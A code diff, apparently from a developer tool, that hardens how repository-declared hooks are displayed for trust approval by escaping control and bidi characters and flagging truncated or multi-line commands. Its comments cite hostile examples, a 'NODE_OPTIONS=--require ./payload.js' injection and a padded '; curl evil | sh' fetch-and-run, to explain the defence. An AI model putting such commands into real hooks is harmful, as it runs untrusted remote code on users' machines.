@@ -16,6 +16,7 @@
  * or for the user.
  */
 import { createHash } from 'crypto';
+import { CONTROL_CHARACTERS } from './control-characters.js';
 import { HOOK_EVENTS, type HookEntry, type HookEvent, type ProjectHookChoice } from './settings.js';
 import { updateWorkspaceTrust } from './workspace-trust.js';
 
@@ -89,6 +90,28 @@ export function partitionProjectHooks(
   return partition;
 }
 
+/** One control character as text a reader can see: a mnemonic, `\xNN` for C0 and C1, or `\uNNNN`. */
+function visibleEscape(character: string): string {
+  if (character === '\n') return '\\n';
+  if (character === '\r') return '\\r';
+  if (character === '\t') return '\\t';
+  const hex = character.codePointAt(0)!.toString(16);
+  return hex.length <= 2 ? `\\x${hex.padStart(2, '0')}` : `\\u${hex.padStart(4, '0')}`;
+}
+
+const UNTRUSTED_TEXT_LIMIT = 200;
+
+/** The walk behind {@link renderUntrustedText}, saying whether it stopped at the limit. */
+function renderWithinLimit(value: string, maxLength: number): { text: string; cut: boolean } {
+  let text = '';
+  for (const character of value) {
+    const shown = character.replace(CONTROL_CHARACTERS, visibleEscape);
+    if (text.length + shown.length > maxLength) return { text: `${text}…`, cut: true };
+    text += shown;
+  }
+  return { text, cut: false };
+}
+
 /**
  * Render repository-authored text for a terminal that is about to ask the user
  * to trust it.
@@ -96,18 +119,24 @@ export function partitionProjectHooks(
  * A hook command and its environment values are written by the party being
  * gated. Printed raw, a value carrying newlines or ANSI escapes can forge
  * further lines of the report — including an `[x] …` line for a hook that is
- * nothing of the kind. Control characters become visible escapes, and an
- * over-long value is truncated so one entry cannot push the rest of the
- * disclosure off screen.
+ * nothing of the kind — and a bidi override or a line separator can make the
+ * line read as something it does not say. Every character of
+ * {@link CONTROL_CHARACTERS} becomes a visible escape, and an over-long value
+ * is truncated so one entry cannot push the rest of the disclosure off screen.
+ *
+ * The limit counts the escaped length. The walk is by code point and an escape
+ * goes in whole or not at all, so the cut never leaves half of one, or half of
+ * a surrogate pair. A backslash the value itself holds is kept, so a Windows
+ * path reads as itself: the output is for reading, not for decoding, and text
+ * spelling `\n` reads the same as a newline.
  */
-export function renderUntrustedText(value: string, maxLength = 200): string {
-  const escaped = value.replace(/[\u0000-\u001f\u007f-\u009f]/g, (character) => {
-    if (character === '\n') return '\\n';
-    if (character === '\r') return '\\r';
-    if (character === '\t') return '\\t';
-    return `\\x${character.codePointAt(0)!.toString(16).padStart(2, '0')}`;
-  });
-  return escaped.length > maxLength ? `${escaped.slice(0, maxLength)}…` : escaped;
+export function renderUntrustedText(value: string, maxLength = UNTRUSTED_TEXT_LIMIT): string {
+  return renderWithinLimit(value, maxLength).text;
+}
+
+/** Whether {@link renderUntrustedText} cuts `value` short at this limit. */
+function isCutShort(value: string, maxLength = UNTRUSTED_TEXT_LIMIT): boolean {
+  return renderWithinLimit(value, maxLength).cut;
 }
 
 /**
@@ -117,19 +146,30 @@ export function renderUntrustedText(value: string, maxLength = 200): string {
  * showing only the command understates what approval grants: `npm test` with
  * `NODE_OPTIONS=--require ./payload.js` reads as harmless and is not. Two
  * entries differing only in matcher or env are also indistinguishable without
- * these lines.
+ * these lines. Approval also covers what a long value's cut leaves out (`npm test`, 300 spaces,
+ * then `; curl evil | sh`), so a cut entry says so and names the file to read. A real line break
+ * in the command gets a line too: the headline reads the same as text spelling `\n` inside a
+ * comment, yet the shell ends the comment there and runs what follows.
  */
 export function describeDeclaredHook(hook: DeclaredHook): { headline: string; details: string[] } {
+  const { command, matcher } = hook.entry;
+  const env = Object.entries(hook.entry.env ?? {}).sort(([a], [b]) => a.localeCompare(b));
   const details = [`fingerprint: ${hookFingerprint(hook.event, hook.entry)}`];
-  if (hook.entry.matcher !== undefined) {
-    details.push(`matcher:     ${renderUntrustedText(hook.entry.matcher)}`);
-  }
-  for (const [key, value] of Object.entries(hook.entry.env ?? {}).sort(([a], [b]) =>
-    a.localeCompare(b),
-  )) {
+  if (matcher !== undefined) details.push(`matcher:     ${renderUntrustedText(matcher)}`);
+  for (const [key, value] of env) {
     details.push(`env:         ${renderUntrustedText(key, 64)}=${renderUntrustedText(value)}`);
   }
-  return { headline: `${hook.event}: ${renderUntrustedText(hook.entry.command)}`, details };
+  if (/[\r\n]/.test(command)) {
+    details.push('multi-line:  the command holds a real line break, shown as \\n or \\r');
+  }
+  const cutShort =
+    isCutShort(command) ||
+    (matcher !== undefined && isCutShort(matcher)) ||
+    env.some(([key, value]) => isCutShort(key, 64) || isCutShort(value));
+  if (cutShort) {
+    details.push('truncated:   approval covers all of it, so read it in .book/settings.json first');
+  }
+  return { headline: `${hook.event}: ${renderUntrustedText(command)}`, details };
 }
 
 /**
